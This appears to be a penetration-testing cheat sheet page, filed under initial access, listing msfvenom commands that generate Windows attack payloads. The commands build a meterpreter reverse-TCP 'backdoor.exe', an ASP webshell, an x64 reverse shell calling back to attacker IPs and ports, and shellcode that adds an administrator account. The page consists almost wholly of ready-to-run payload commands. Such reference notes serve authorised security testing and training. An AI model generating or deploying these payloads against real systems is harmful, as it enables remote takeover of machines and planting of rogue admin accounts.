---
title: msfvenom - Generate Payloads
category: initial-access
subcategory: payloads
os: linux
command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe -o shell.exe
tools: msfvenom
---


### Windows EXE meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
```

### Windows ASP webshell

```bash
msfvenom LHOST=10.10.2.252 LPORT=1234 -f asp > shell.asp
```

### Windows EXE shell (x64)

```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe > shell.exe
```

### Add user payload (Python shellcode with bad chars)

```bash
msfvenom -p windows/adduser USER=admin PASS=offsec123 -b \x00\x0A\x0D\x25\x26\x2B\x3D -v buf -f py
```
